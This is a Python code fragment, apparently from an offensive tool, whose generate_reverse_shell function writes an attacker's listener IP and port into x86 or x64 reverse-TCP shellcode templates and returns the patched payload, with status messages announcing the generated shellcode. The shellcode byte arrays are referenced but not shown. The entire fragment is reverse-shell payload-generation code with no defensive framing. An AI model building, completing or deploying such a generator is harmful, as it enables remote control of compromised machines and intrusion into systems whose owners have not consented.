def _ip_to_bytes(ip_str):
    parts = ip_str.split(".")
    if len(parts) != 4:
        raise ValueError(f"Invalid IP address: {ip_str}")
    return bytes(int(p) for p in parts)


def _port_to_bytes(port):
    return struct.pack(">H", port)


def generate_reverse_shell(lhost, lport, arch):
    ip_bytes = _ip_to_bytes(lhost)
    port_bytes = _port_to_bytes(lport)

    if arch == "x86":
        sc = bytearray(_SHELLCODE_X86)
        sc[LHOST_OFFSET_X86:LHOST_OFFSET_X86 + 4] = ip_bytes
        sc[LPORT_OFFSET_X86:LPORT_OFFSET_X86 + 2] = port_bytes
    elif arch == "x64":
        sc = bytearray(_SHELLCODE_X64)
        sc[LHOST_OFFSET_X64:LHOST_OFFSET_X64 + 4] = ip_bytes
        sc[LPORT_OFFSET_X64:LPORT_OFFSET_X64 + 2] = port_bytes
    else:
        raise ValueError(f"Unsupported architecture: {arch}")

    info(f"Payload: reverse_tcp_shell ({arch})")
    info(f"LHOST={lhost} LPORT={lport}")
    success(f"Shellcode generated: {len(sc)} bytes (standalone)")

    return bytes(sc)
